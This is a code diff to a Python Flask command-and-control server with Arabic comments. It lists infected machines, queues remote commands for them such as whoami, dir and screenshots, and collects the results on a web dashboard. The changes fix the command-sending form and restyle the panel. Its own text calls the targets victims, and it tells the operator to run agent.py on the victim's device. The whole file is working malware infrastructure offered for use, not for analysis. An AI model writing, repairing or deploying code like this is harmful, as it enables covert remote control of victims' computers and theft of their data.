@@ -1,7 +1,5 @@
 # ============================================================
-# C2 Server - Command & Control
-# يستقبل اتصالات من الأجهزة المصابة
-# يوفر لوحة تحكم ويب لإدارة الأجهزة
+# C2 Server - Command & Control (Fixed)
 # ============================================================
 
 import os
@@ -13,16 +11,16 @@ from flask import Flask, request, jsonify, render_template_string, redirect, url
 
 app = Flask(__name__)
 app.secret_key = os.urandom(32).hex()
+app.url_map.strict_slashes = False
 
 # ============================================================
-# تخزين مؤقت (يضيع عند إعادة تشغيل Render)
+# تخزين مؤقت
 # ============================================================
 DATA_FILE = '/tmp/c2_data.json'
 COMMANDS_FILE = '/tmp/c2_commands.json'
 RESULTS_FILE = '/tmp/c2_results.json'
 
-# كلمة مرور لوحة التحكم (غيرها!)
-ADMIN_PASSWORD = "changeme123"
+ADMIN_PASSWORD = "changeme123"  # ← غيرها
 
 # ============================================================
 # دوال التخزين
@@ -56,7 +54,6 @@ def get_results():
     return load_json(RESULTS_FILE, {})
 
 def cleanup_old_data():
-    """حذف الأجهزة التي لم تتصل منذ 7 أيام"""
     devices = get_devices()
     now = datetime.now()
     to_delete = []
@@ -74,12 +71,10 @@ def cleanup_old_data():
 
 
 # ============================================================
-# API للعميل (Agent)
+# API للعميل
 # ============================================================
-
 @app.route('/api/register', methods=['POST'])
 def register():
-    """تسجيل جهاز جديد"""
     data = request.get_json()
     if not data:
         return jsonify({"error": "no data"}), 400
@@ -102,13 +97,11 @@ def register():
         "online": True
     }
     save_json(DATA_FILE, devices)
-    
     return jsonify({"status": "ok", "device_id": device_id}), 200
 
 
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
-    """نبضة حياة - تُستدعى كل 10 ثوانٍ"""
     data = request.get_json()
     device_id = data.get('device_id')
     
@@ -121,11 +114,8 @@ def heartbeat():
         devices[device_id]['online'] = True
         save_json(DATA_FILE, devices)
     
-    # إرجاع الأوامر الجديدة
     commands = get_commands()
     device_commands = commands.get(device_id, [])
-    
-    # إرجاع الأوامر غير المنفذة
     pending = [c for c in device_commands if not c.get('executed', False)]
     
     return jsonify({"status": "ok", "commands": pending}), 200
@@ -133,7 +123,6 @@ def heartbeat():
 
 @app.route('/api/result', methods=['POST'])
 def result():
-    """استقبال نتيجة تنفيذ أمر"""
     data = request.get_json()
     device_id = data.get('device_id')
     command_id = data.get('command_id')
@@ -142,7 +131,6 @@ def result():
     if not device_id or not command_id:
         return jsonify({"error": "missing fields"}), 400
     
-    # تحديث حالة الأمر
     commands = get_commands()
     if device_id in commands:
         for cmd in commands[device_id]:
@@ -151,7 +139,6 @@ def result():
                 cmd['executed_at'] = datetime.now().isoformat()
         save_json(COMMANDS_FILE, commands)
     
-    # حفظ النتيجة
     results = get_results()
     if device_id not in results:
         results[device_id] = []
@@ -160,7 +147,6 @@ def result():
         "output": output,
         "timestamp": datetime.now().isoformat()
     })
-    # الاحتفاظ بآخر 100 نتيجة
     results[device_id] = results[device_id][-100:]
     save_json(RESULTS_FILE, results)
     
@@ -168,7 +154,7 @@ def result():
 
 
 # ============================================================
-# لوحة التحكم (Web UI)
+# قوالب HTML
 # ============================================================
 LOGIN_TEMPLATE = """
 <!DOCTYPE html>
@@ -214,6 +200,7 @@ DASHBOARD_TEMPLATE = """
         * { box-sizing: border-box; }
         body { font-family: 'Segoe UI', Arial; background: #0a0a0a; color: #eee; margin: 0; padding: 20px; }
         h1 { color: #e94560; }
+        h2, h3 { color: #f9a826; }
         .header { display: flex; justify-content: space-between; align-items: center; 
                   border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
         .logout { color: #e94560; text-decoration: none; }
@@ -228,19 +215,20 @@ DASHBOARD_TEMPLATE = """
         .device .hostname { font-weight: bold; font-size: 16px; }
         .device .info { color: #999; font-size: 13px; margin-top: 5px; }
         .device .last-seen { color: #f9a826; font-size: 12px; }
-        .device-detail { background: #0f3460; padding: 20px; border-radius: 8px; margin-top: 20px; display: none; }
-        .device-detail.active { display: block; }
         .cmd-input { width: 100%; padding: 10px; background: #000; color: #0f0; 
                      border: 1px solid #333; border-radius: 5px; font-family: monospace; }
         .btn { background: #e94560; color: white; padding: 10px 20px; border: none; 
-               border-radius: 5px; cursor: pointer; margin-top: 10px; }
+               border-radius: 5px; cursor: pointer; margin-top: 10px; font-size: 16px; }
         .btn:hover { background: #c73650; }
         .results { background: #000; padding: 15px; border-radius: 5px; margin-top: 15px; 
                    font-family: monospace; color: #0f0; max-height: 400px; overflow-y: auto; 
-                   white-space: pre-wrap; }
+                   white-space: pre-wrap; word-wrap: break-word; }
         .refresh { background: #0f3460; color: white; padding: 8px 15px; text-decoration: none; 
-                   border-radius: 5px; }
-        .back { color: #e94560; text-decoration: none; }
+                   border-radius: 5px; display: inline-block; margin-bottom: 15px; }
+        .back { color: #e94560; text-decoration: none; display: inline-block; margin-bottom: 15px; }
+        .info-row { background: #0f3460; padding: 15px; border-radius: 8px; margin-bottom: 15px; color: #eee; }
+        .result-item { border-bottom: 1px solid #333; padding: 10px 0; }
+        .result-time { color: #f9a826; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -265,53 +253,76 @@ DASHBOARD_TEMPLATE = """
     </div>
     
     {% if not selected %}
-    <h2>📱 Devices</h2>
-    <a href="/dashboard" class="refresh">🔄 Refresh</a>
-    <br><br>
     
-    {% for device_id, info in devices.items() %}
-    <div class="device {% if not info.online %}offline{% endif %}" 
-         onclick="window.location='/dashboard?device={{ device_id }}'">
-        <div class="hostname">
-            {% if info.online %}🟢{% else %}⚫{% endif %}
-            {{ info.hostname }} ({{ info.username }})
+    <h2>📱 الأجهزة المتصلة</h2>
+    <a href="/dashboard" class="refresh">🔄 تحديث</a>
+    
+    {% if devices %}
+        {% for device_id, info in devices.items() %}
+        <div class="device {% if not info.online %}offline{% endif %}" 
+             onclick="window.location='/dashboard?device={{ device_id }}'">
+            <div class="hostname">
+                {% if info.online %}🟢{% else %}⚫{% endif %}
+                {{ info.hostname }} ({{ info.username }})
+            </div>
+            <div class="info">
+                💻 {{ info.os }} {{ info.os_version }} | 
+                🌐 {{ info.ip }} | 
+                {% if info.admin %}👑 Admin{% else %}👤 User{% endif %}
+            </div>
+            <div class="last-seen">⏰ آخر ظهور: {{ info.last_seen }}</div>
         </div>
-        <div class="info">
-            💻 {{ info.os }} {{ info.os_version }} | 
-            🌐 {{ info.ip }} | 
-            {% if info.admin %}👑 Admin{% else %}👤 User{% endif %}
-        </div>
-        <div class="last-seen">⏰ آخر ظهور: {{ info.last_seen }}</div>
-    </div>
-    {% endfor %}
+        {% endfor %}
+    {% else %}
+        <p style="color:#999; text-align:center; padding:50px;">
+            لا توجد أجهزة متصلة بعد. شغّل العميل (agent.py) على جهاز الضحية.
+        </p>
+    {% endif %}
     
     {% else %}
     
     <a href="/dashboard" class="back">← رجوع للقائمة</a>
+    
     <h2>🖥️ {{ selected.hostname }}</h2>
-    <div class="info" style="color:#999; margin-bottom:15px;">
-        👤 {{ selected.username }} | 💻 {{ selected.os }} | 🌐 {{ selected.ip }} | 
+    <div class="info-row">
+        👤 {{ selected.username }} | 
+        💻 {{ selected.os }} {{ selected.os_version }} | 
+        🌐 {{ selected.ip }} | 
         {% if selected.admin %}👑 Admin{% else %}👤 User{% endif %}
+        <br>⏰ آخر ظهور: {{ selected.last_seen }}
     </div>
     
     <h3>⚡ تنفيذ أمر</h3>
-    <form method="POST" action="/dashboard?device={{ device_id }}">
+    <form method="POST" action="/dashboard">
+        <input type="hidden" name="device_id" value="{{ device_id }}">
         <input type="text" name="command" class="cmd-input" 
-               placeholder="مثال: sysinfo | shell whoami | screenshot" required>
-        <button type="submit" class="btn">Send Command</button>
+               placeholder="مثال: sysinfo | whoami | dir | screenshot" required autofocus>
+        <button type="submit" class="btn">📤 Send Command</button>
     </form>
     
     <h3>📜 النتائج</h3>
-    <div class="results">{% for r in results %}[{{ r.timestamp }}]
-{{ r.output }}
-
-{% endfor %}</div>
+    <div class="results">
+        {% if results %}
+            {% for r in results %}
+            <div class="result-item">
+                <div class="result-time">⏰ {{ r.timestamp }}</div>
+                <div>{{ r.output }}</div>
+            </div>
+            {% endfor %}
+        {% else %}
+            <div style="color:#999;">لا توجد نتائج بعد. أرسل أمراً وانتظر 8 ثوانٍ.</div>
+        {% endif %}
+    </div>
     
     {% endif %}
 </body>
 </html>
 """
 
+
+# ============================================================
+# المسارات
+# ============================================================
 @app.route('/')
 def index():
     return redirect('/dashboard')
@@ -331,7 +342,7 @@ def logout():
     session.pop('logged_in', None)
     return redirect('/login')
 
-@app.route('/dashboard')
+@app.route('/dashboard', methods=['GET', 'POST'])
 def dashboard():
     if not session.get('logged_in'):
         return redirect('/login')
@@ -358,17 +369,12 @@ def dashboard():
     # عدد الأوامر
     total_commands = sum(len(cmds) for cmds in commands.values())
     
-    # إذا اختير جهاز
-    selected_id = request.args.get('device')
+    # استقبال device_id من GET أو POST
+    selected_id = request.args.get('device') or request.form.get('device_id')
     selected = None
     device_results = []
     
-    if selected_id and selected_id in devices:
-        selected = devices[selected_id]
-        device_results = results_data.get(selected_id, [])
-        device_results = list(reversed(device_results[-20:]))
-    
-    # معالجة إرسال أمر
+    # معالجة إرسال أمر جديد (POST)
     if request.method == 'POST' and selected_id:
         command_text = request.form.get('command', '').strip()
         if command_text:
@@ -381,7 +387,14 @@ def dashboard():
                 "executed": False
             })
             save_json(COMMANDS_FILE, commands)
+            # إعادة توجيه إلى GET (لتفادي إعادة الإرسال عند التحديث)
             return redirect(f'/dashboard?device={selected_id}')
+    
+    # جلب بيانات الجهاز المختار
+    if selected_id and selected_id in devices:
+        selected = devices[selected_id]
+        device_results = results_data.get(selected_id, [])
+        device_results = list(reversed(device_results[-20:]))
     
     return render_template_string(
         DASHBOARD_TEMPLATE,
@@ -395,9 +408,6 @@ def dashboard():
     )
 
 
-# ============================================================
-# Health check
-# ============================================================
 @app.route('/health')
 def health():
     return "OK", 200
